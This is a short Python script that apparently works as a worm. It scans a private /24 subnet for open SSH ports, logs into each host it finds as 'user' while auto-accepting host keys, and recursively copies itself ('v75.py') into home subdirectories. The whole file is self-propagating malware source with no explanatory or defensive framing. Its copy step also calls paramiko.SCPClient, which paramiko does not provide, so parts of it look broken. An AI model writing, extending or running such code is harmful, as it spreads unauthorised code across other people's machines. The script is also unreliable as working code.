import os
import sys
import paramiko
import socket
import ipaddress
import threading
from time import sleep

def file_found(ssh, path_dir):
    stdin, stdout, stderr = ssh.exec_command(f'ls {path_dir}')
    return 'file.txt' in stdout.read().decode('utf-8').split('\n')

def copy_file(ssh, current_script, start_path):
    scp = paramiko.SCPClient(ssh.get_transport())
    sftp = ssh.open_sftp()

    for entry in sftp.listdir_attr(start_path):
        if entry.st_mode & 0o40000:
            subdir = os.path.join(start_path, entry.filename)
            if not file_found(ssh, subdir):
                dest_file = os.path.join(subdir, os.path.basename(current_script))
                scp.put(current_script, dest_file)
                copy_file(ssh, current_script, subdir)

    scp.close()
    sftp.close()

def launch_copy_file(hostname, username):
    current_script = 'v75.py' 
    start_path = "/home/user"

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname, username=username)

    copy_file(ssh, current_script, start_path)
    ssh.close()

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(2.0)
        result = sock.connect_ex((ip, port))
        if result == 0:
            final[ip] = "OPEN"
            launch_copy_file(str(ip), username)
        else:
            final[ip] = "CLOSED"
        sock.close()
    except:
        pass

if __name__ == "__main__":
    
    username = "user"

    max_threads = 50
    final = {}
    port = 22
    subnet = '192.168.56.0/24'

    for ip in ipaddress.IPv4Network(subnet):
        threading.Thread(target=check_port, args=[str(ip), port]).start()

        while threading.active_count() > max_threads:
            sleep(1)

    #print(final)
